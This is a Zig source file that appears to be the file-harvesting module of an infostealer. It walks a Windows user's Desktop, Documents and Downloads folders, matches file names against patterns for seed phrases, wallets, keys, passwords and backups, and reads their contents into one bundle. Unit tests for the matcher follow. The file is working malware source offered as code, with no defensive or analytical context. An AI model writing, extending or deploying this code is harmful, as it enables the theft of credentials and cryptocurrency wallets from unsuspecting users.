const std = @import("std");
const file_io = @import("../parsers/file_io.zig");

const masks = [_][]const u8{ "*.txt", "*seed*", "*.dat", "*.wallet", "*backup*", "*.key", "*password*" };

const search_dirs = [_][]const u8{ "Desktop", "Documents", "Downloads" };

const max_file_size: usize = 5 * 1024 * 1024;

fn matchesMask(name: []const u8, mask: []const u8) bool {
    if (mask.len == 0) return name.len == 0;
    if (mask[0] == '*') {
        if (matchesMask(name, mask[1..])) return true;
        if (name.len > 0 and matchesMask(name[1..], mask)) return true;
        return false;
    }
    if (name.len == 0) return false;
    if (mask[0] == '?' or std.ascii.toLower(name[0]) == std.ascii.toLower(mask[0])) {
        return matchesMask(name[1..], mask[1..]);
    }
    return false;
}

fn matchesAnyMask(name: []const u8) bool {
    for (masks) |mask| {
        if (matchesMask(name, mask)) return true;
    }
    return false;
}

fn readFileContent(allocator: std.mem.Allocator, path: []const u8) ?[]const u8 {
    const mapped = file_io.MappedFile.open(path) orelse {
        var file = std.fs.openFileAbsolute(path, .{}) catch return null;

        defer file.close();
        const size = file.getEndPos() catch return null;
        if (size > max_file_size) return null;
        const content = file.readToEndAlloc(allocator, max_file_size) catch return null;
        return content;
    };
    defer mapped.close();

    const size = mapped.size;
    if (size > max_file_size) return null;

    return allocator.dupe(u8, mapped.slice());
}

pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
    const user_profile = std.process.getEnvVarOwned(allocator, "USERPROFILE") catch return error.UserProfileNotFound;
    defer allocator.free(user_profile);

    var result = std.ArrayList(u8).init(allocator);
    errdefer result.deinit();

    var file_count: usize = 0;

    for (search_dirs) |dir_name| {
        const dir_path = try std.fs.path.join(allocator, &[_][]const u8{ user_profile, dir_name });
        defer allocator.free(dir_path);

        var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch continue;
        defer dir.close();

        var walker = try dir.walk(allocator);
        defer walker.deinit();

        while (try walker.next()) |entry| {
            if (entry.kind != .file) continue;
            if (!matchesAnyMask(entry.basename)) continue;

            const full_path = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.path });
            defer allocator.free(full_path);

            const content = readFileContent(allocator, full_path) orelse continue;

            if (file_count > 0) {
                try result.appendSlice("\n\n--- ");
            } else {
                try result.appendSlice("--- ");
            }
            try result.appendSlice(entry.path);
            try result.appendSlice(" ---\n");

            if (content.len > 0) {
                try result.appendSlice(content);
            } else {
                try result.appendSlice("[empty file]");
            }

            allocator.free(content);
            file_count += 1;
        }
    }

    if (file_count == 0) {
        try result.appendSlice("No matching files found");
    }

    return try result.toOwnedSlice();
}

const testing = std.testing;

test "matchesMask handles wildcards" {
    try testing.expect(matchesMask("seed.txt", "*seed*"));
    try testing.expect(matchesMask("backup.dat", "*backup*"));
    try testing.expect(matchesMask("file.txt", "*.txt"));
    try testing.expect(!matchesMask("file.txt", "*.dat"));
    try testing.expect(matchesMask("password.txt", "*password*"));
    try testing.expect(matchesMask("wallet.dat", "*.wallet"));
    try testing.expect(matchesMask("my.key", "*.key"));
}

test "matchesMask is case insensitive" {
    try testing.expect(matchesMask("SEED.TXT", "*seed*"));
    try testing.expect(matchesMask("Backup.DAT", "*backup*"));
    try testing.expect(matchesMask("File.TXT", "*.txt"));
}

test "matchesMask edge cases" {
    try testing.expect(matchesMask("seed", "*seed*"));
    try testing.expect(!matchesMask("", "*seed*"));
    try testing.expect(!matchesMask("seed", "*.seed"));
    try testing.expect(matchesMask("password.bak", "*password*"));
}

test "matchesAnyMask checks all masks" {
    try testing.expect(matchesAnyMask("mywallet.dat"));
    try testing.expect(matchesAnyMask("seed_phrase.txt"));
    try testing.expect(matchesAnyMask("backup_2024.key"));
    try testing.expect(!matchesAnyMask("innocent.jpg"));
    try testing.expect(!matchesAnyMask("readme.md"));
}

test "collect handles missing userprofile" {
    const result = collect(testing.allocator);
    if (result) |r| testing.allocator.free(r) else |_| {}
}

test "readFileContent handles nonexistent path" {
    const content = readFileContent(testing.allocator, "C:\\__nonexistent__file__");
    try testing.expect(content == null);
}
